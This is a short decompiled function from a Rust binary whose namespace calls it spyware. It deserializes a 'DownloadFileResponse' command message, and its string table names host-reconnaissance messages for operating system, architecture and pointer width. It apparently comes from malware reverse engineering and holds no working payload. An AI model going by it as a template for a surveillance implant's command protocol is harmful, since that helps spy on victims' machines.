long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DownloadFileResponse>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "DownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widt", 20);
    return a0;
}
